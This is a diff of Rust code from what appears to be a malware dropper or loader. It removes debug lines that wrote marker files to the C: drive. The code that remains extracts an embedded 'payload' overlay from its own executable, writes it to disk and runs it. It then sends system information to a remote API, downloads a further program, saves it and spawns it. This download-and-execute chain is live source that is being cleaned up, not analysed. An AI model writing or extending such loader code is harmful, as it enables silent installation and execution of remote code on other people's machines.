@@ -54,7 +54,6 @@ fn extract_overlay() -> Overlay {
 }
 
 fn main() {
-    File::create("C:\\1.txt").unwrap().write_all(b"1").unwrap();
     utils::tmpdir();
 
     let current = current_exe().unwrap().to_str().unwrap().to_string();
@@ -63,23 +62,18 @@ fn main() {
         return;
     }
 
-    File::create("C:\\2.txt").unwrap().write_all(b"1").unwrap();
-
     // ensure, that payload is extracted
     let name = current_exe().unwrap().file_name().unwrap().to_str().unwrap().to_string();
     let path = std::env::current_dir().unwrap().join(&name);
 
     if !path.exists() {
-        File::create("C:\\3.txt").unwrap().write_all(b"1").unwrap();
         let overlay = extract_overlay();
 
         let mut file = File::create(&path).unwrap();
         file.write_all(&overlay.bytes).unwrap();
-        File::create("C:\\4.txt").unwrap().write_all(b"1").unwrap();
     }
 
     // and run it!
-    File::create("C:\\5.txt").unwrap().write_all(b"1").unwrap();
     Command::new(&path).spawn().unwrap();
 
     // ...
@@ -87,7 +81,6 @@ fn main() {
 
     // check if we should continue?
     if !should_run() {
-        File::create("C:\\6.txt").unwrap().write_all(b"1").unwrap();
         return;
     }
 
@@ -97,11 +90,8 @@ fn main() {
         mem_total: 0.0
     }).unwrap();
 
-    File::create("C:\\7.txt").unwrap().write_all(b"1").unwrap();
-
     let upload = api_client.client_download().unwrap();
     let path = utils::save(upload).unwrap();
-    File::create("C:\\8.txt").unwrap().write_all(b"1").unwrap();
 
     // run program!
     Command::new(path).spawn().unwrap();
